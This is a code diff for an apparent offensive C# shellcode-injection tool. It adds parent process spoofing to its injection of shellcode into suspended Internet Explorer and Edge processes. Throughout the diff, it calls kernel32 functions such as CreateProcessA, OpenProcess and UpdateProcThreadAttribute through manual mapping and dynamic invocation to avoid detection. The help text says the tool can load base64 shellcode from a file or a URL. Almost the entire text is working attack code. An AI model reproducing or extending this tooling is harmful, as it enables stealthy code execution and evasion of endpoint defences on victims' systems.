@@ -37,8 +37,21 @@ namespace Dinvoke
             {
                 lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation
             };
-            
+
             bool retValue = (bool)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateProcessA", typeof(Delegates.CreateProcess), ref funcargs);
+            lpProcessInformation = (Structs.PROCESS_INFORMATION)funcargs[9];
+            return retValue;
+        }
+
+        public static Boolean CreateProcessA(Data.PE.PE_MANUAL_MAP kernel32Details, string lpApplicationName, string lpCommandLine, ref Structs.SECURITY_ATTRIBUTES lpProcessAttributes, ref Structs.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, Structs.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Structs.STARTUPINFOEX lpStartupInfo, out Structs.PROCESS_INFORMATION lpProcessInformation)
+        {
+            lpProcessInformation = new Structs.PROCESS_INFORMATION();
+            object[] funcargs =
+            {
+                lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation
+            };
+
+            bool retValue = (bool)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateProcessA", typeof(Delegates.CreateProcess2), ref funcargs);
             lpProcessInformation = (Structs.PROCESS_INFORMATION)funcargs[9];
             return retValue;
         }
@@ -50,9 +63,33 @@ namespace Dinvoke
             {
                 hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
             };
-       
+
             IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateRemoteThread", typeof(Delegates.CreateRemoteThread), ref funcargs);
             lpThreadId = (IntPtr)funcargs[6];
+            return retValue;
+        }
+
+        public static bool InitializeProcThreadAttributeList(Data.PE.PE_MANUAL_MAP kernel32Details, IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)
+        {
+            object[] funcargs =
+            {
+                lpAttributeList, dwAttributeCount, dwFlags, lpSize
+            };
+            bool retValue = (bool)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "InitializeProcThreadAttributeList", typeof(Delegates.InitializeProcThreadAttributeList), ref funcargs);
+            lpSize = (IntPtr)funcargs[3];
+            return retValue;
+        }
+        public static IntPtr OpenProcess(Data.PE.PE_MANUAL_MAP kernel32Details, uint processAccess, bool bInheritHandle, uint processId)
+        {
+            object[] funcargs = { processAccess, bInheritHandle, processId };
+            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "OpenProcess", typeof(Delegates.OpenProcess), ref funcargs);
+            return retValue;
+        }
+
+        public static bool UpdateProcThreadAttribute(Data.PE.PE_MANUAL_MAP kernel32Details, IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
+        {
+            object[] funcargs = { lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize };
+            bool retValue = (bool)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "UpdateProcThreadAttribute", typeof(Delegates.UpdateProcThreadAttribute), ref funcargs);
             return retValue;
         }
         #endregion
@@ -95,25 +132,57 @@ namespace Dinvoke
             {
                 byte[] buf = PrepareBytes(parsedArgs["/f"]);
                 Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
-                Sacrificial(buf);
+                if (parsedArgs.ContainsKey("/process"))
+                {
+                    Console.WriteLine(String.Format("[+] Attempting to use {0} as the parent process.", parsedArgs["/process"]));
+                    Sacrificial(buf, parsedArgs["/process"]);
+                }
+                else
+                {
+                    Sacrificial(buf);
+                }
             }
             else if (parsedArgs["/m"] == "2" && !parsedArgs.ContainsKey("/f"))
             {
                 byte[] buf = PrepareBytes();
                 Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
-                Sacrificial(buf);
+                if (parsedArgs.ContainsKey("/process"))
+                {
+                    Console.WriteLine(String.Format("[+] Attempting to use {0} as the parent process.", parsedArgs["/process"]));
+                    Sacrificial(buf, parsedArgs["/process"]);
+                }
+                else
+                {
+                    Sacrificial(buf);
+                }
             }
             else if (parsedArgs["/m"] == "3" && parsedArgs.ContainsKey("/f"))
             {
                 byte[] buf = PrepareBytes(parsedArgs["/f"]);
                 Console.WriteLine("[+] Mapping into Edge!");
-                Mapping(buf);
+                if (parsedArgs.ContainsKey("/process"))
+                {
+                    Console.WriteLine(String.Format("[+] Attempting to use {0} as the parent process.", parsedArgs["/process"]));
+                    Mapping(buf, parsedArgs["/process"]);
+                }
+                else
+                {
+                    Mapping(buf);
+                }
             }
             else if (parsedArgs["/m"] == "3" && !parsedArgs.ContainsKey("/f"))
             {
                 byte[] buf = PrepareBytes();
                 Console.WriteLine("[+] Mapping into Edge!");
-                Mapping(buf);
+                if (parsedArgs.ContainsKey("/process"))
+                {
+                    Console.WriteLine(String.Format("[+] Attempting to use {0} as the parent process.", parsedArgs["/process"]));
+                    Mapping(buf, parsedArgs["/process"]);
+                }
+                else
+                {
+                    Mapping(buf);
+                }
             }
             else 
             {
@@ -126,12 +195,12 @@ namespace Dinvoke
             string help = @"
 [-] Usage: DinvokeDeez.exe
     Mandatory Keys
-    /m => Specifies the injection type. 1 = Local Process Injection, 2 = Remote Process Injection, 3 = Injection via NtCreateSection + NtMapViewOfSection (default)
+    /m => Specifies the injection method. 1 = Local Process Injection, 2 = Remote Process Injection, 3 = Injection via NtCreateSection + NtMapViewOfSection (default)
           Mapping will use edge, remote process injection uses internet explorer ¯\_(ツ)_/¯
 
     Optional Keys
     /f => Specifies a path to alternative base64 encoded shellcode to inject with. Can be a url too.
-    
+    /process => Specify a process name to use (Parent process spoofing). Only works with methods 2 and 3.
     example: DinvokeDeez.exe /m:1 /f:D:\Downloads\donut_v0.9.3\test.bin
 ";
             Console.WriteLine(help);
@@ -221,17 +290,68 @@ namespace Dinvoke
             return;
         }
 
-        public static void Sacrificial(byte[] buf) //sacrificial internet explorer moment
+        public static void Sacrificial(byte[] buf, string processName = "") //sacrificial internet explorer moment
         {
             Structs.STARTUPINFO si = new Structs.STARTUPINFO();
+            Structs.STARTUPINFOEX sex = new Structs.STARTUPINFOEX();
             Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
             Structs.SECURITY_ATTRIBUTES lpa = new Structs.SECURITY_ATTRIBUTES();
             Structs.SECURITY_ATTRIBUTES lta = new Structs.SECURITY_ATTRIBUTES();
             Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
+            IntPtr handle = IntPtr.Zero;
 
-            CreateProcessA(kernel32Details, null, "C:\\Program Files\\Internet explorer\\iexplore.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi); //suspended makes the process hidden from ui + seems to be more stable
-            IntPtr handle = pi.hProcess;
-            Console.WriteLine("[+] Process Created!");
+            if (!processName.Equals(""))
+            {
+                IntPtr lpSize = IntPtr.Zero;
+                IntPtr lpValueProc = IntPtr.Zero;
+                IntPtr hSourceProcessHandle = IntPtr.Zero;
+                InitializeProcThreadAttributeList(kernel32Details, IntPtr.Zero, 1, 0, ref lpSize);
+                sex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                InitializeProcThreadAttributeList(kernel32Details, sex.lpAttributeList, 1, 0, ref lpSize);
+                Console.WriteLine("[+] Thread attribute space allocated!");
+
+                if (Process.GetProcessesByName(processName).Length == 0)
+                {
+                    Console.WriteLine("[!] Process doesn't exist!");
+                    Environment.Exit(1);
+                }
+
+                IntPtr parentHandle = IntPtr.Zero;
+                Process[] procArr = Process.GetProcessesByName(processName);
+                foreach (Process p in procArr)
+                {
+                    uint parentID = (uint)p.Id;
+                    parentHandle = OpenProcess(kernel32Details, 0x0080 | 0x0040, false, parentID); // createProcess | duplicatehandle
+                    if (parentHandle != IntPtr.Zero)
+                    {
+                        break;
+                    }
+                    if (parentID == procArr[procArr.Length - 1].Id)
+                    {
+                        Console.WriteLine(String.Format("[!] No process with name {0} is accessible with current privileges", processName));
+                        Environment.Exit(1);
+                    }
+
+                }
+                Console.WriteLine("[+] Parent handle obtained!");
+
+                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValueProc, parentHandle);
+                Console.WriteLine("[+] Parent handle written to memory!");
+
+                UpdateProcThreadAttribute(kernel32Details, sex.lpAttributeList, 0, (IntPtr)0x00020000, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero); //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                Console.WriteLine("[+] Process Attributes Updated");
+
+                CreateProcessA(kernel32Details, null, "C:\\Program Files\\Internet explorer\\iexplore.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED | Structs.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sex, out pi); //suspended makes the process hidden from ui + seems to be more stable
+                handle = pi.hProcess;
+                Console.WriteLine("[+] Process Created!");
+            }
+            else
+            {
+                CreateProcessA(kernel32Details, null, "C:\\Program Files\\Internet explorer\\iexplore.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED | Structs.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi); //suspended makes the process hidden from ui + seems to be more stable
+                handle = pi.hProcess;
+                Console.WriteLine("[+] Process Created!");
+            }
 
             IntPtr baseaddr = IntPtr.Zero;
             IntPtr regionSizePointer = (IntPtr)buf.Length;
@@ -262,18 +382,68 @@ namespace Dinvoke
             return;
         }
 
-        public static void Mapping(byte[] buf)
+        public static void Mapping(byte[] buf, string processName = "") 
         {
             Structs.STARTUPINFO si = new Structs.STARTUPINFO();
+            Structs.STARTUPINFOEX sex = new Structs.STARTUPINFOEX();
             Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
             Structs.SECURITY_ATTRIBUTES lpa = new Structs.SECURITY_ATTRIBUTES();
             Structs.SECURITY_ATTRIBUTES lta = new Structs.SECURITY_ATTRIBUTES();
 
             Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
-            bool succ = CreateProcessA(kernel32Details, null, @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
-            if (succ)
+            if (!processName.Equals(""))
             {
-                Console.WriteLine("[+] Process Created");
+                IntPtr lpSize = IntPtr.Zero;
+                IntPtr lpValueProc = IntPtr.Zero;
+                IntPtr hSourceProcessHandle = IntPtr.Zero;
+                InitializeProcThreadAttributeList(kernel32Details, IntPtr.Zero, 1, 0, ref lpSize);
+                sex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                InitializeProcThreadAttributeList(kernel32Details, sex.lpAttributeList, 1, 0, ref lpSize);
+                Console.WriteLine("[+] Thread attribute space allocated!");
+
+                if (Process.GetProcessesByName(processName).Length == 0)
+                {
+                    Console.WriteLine("[!] Process doesn't exist!");
+                    Environment.Exit(1);
+                }
+
+                IntPtr parentHandle = IntPtr.Zero;
+                Process[] procArr = Process.GetProcessesByName(processName);
+                foreach (Process p in procArr)
+                {
+                    uint parentID = (uint)p.Id;
+                    parentHandle = OpenProcess(kernel32Details, 0x0080 | 0x0040, false, parentID); // createProcess | duplicatehandle
+                    if (parentHandle != IntPtr.Zero)
+                    {
+                        break;
+                    }
+                    if (parentID == procArr[procArr.Length - 1].Id)
+                    {
+                        Console.WriteLine(String.Format("[!] No process with name {0} is accessible with current privileges", processName));
+                        Environment.Exit(1);
+                    }
+
+                }
+                Console.WriteLine("[+] Parent handle obtained!");
+
+                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValueProc, parentHandle);
+                Console.WriteLine("[+] Parent handle written to memory!");
+
+                UpdateProcThreadAttribute(kernel32Details, sex.lpAttributeList, 0, (IntPtr)0x00020000, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero); //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                Console.WriteLine("[+] Process Attributes Updated");
+
+                CreateProcessA(kernel32Details, null, @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED | Structs.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sex, out pi); //suspended makes the process hidden from ui + seems to be more stable
+                Console.WriteLine("[+] Process Created!");
+
+            }
+            else
+            {
+                bool succ = CreateProcessA(kernel32Details, null, @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
+                if (succ)
+                {
+                    Console.WriteLine("[+] Process Created");
+                }
             }
 
 
